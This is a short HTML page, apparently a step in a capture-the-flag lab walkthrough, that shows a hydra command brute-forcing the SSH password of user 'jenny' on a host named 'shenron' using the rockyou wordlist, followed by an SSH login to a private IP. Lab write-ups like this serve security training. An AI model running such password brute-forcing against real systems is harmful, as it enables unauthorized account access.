<body><div class="page"><h1 class="title">4.2 Find SSH password with hydra</h1><br/><br />1. Use "hydra: as follows on your Kali Machine.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$hydra</span>&nbsp;-l&nbsp;jenny&nbsp;-P&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>usr<span style="color:#a52a2a;font-weight:700">/</span>share<span style="color:#a52a2a;font-weight:700">/</span>wordlists<span style="color:#a52a2a;font-weight:700">/</span>rockyou.txt&nbsp;shenron&nbsp;<span style="color:#a52a2a;font-weight:700">ssh</span></div></div><br /><br />	<span style="color:#ffa500;">Output:</span>    <br />    <img src="images/752-1.png" alt="images/752-1.png" /><br /><br />    You have jenny's password.<br /><br />2. Connect via SSH.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$ssh</span>&nbsp;jenny@192.168.12.39</div></div><br /><br />	<span style="color:#ffa500;">Output:</span>    <br />    <img src="images/752-2.png" alt="images/752-2.png" /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>
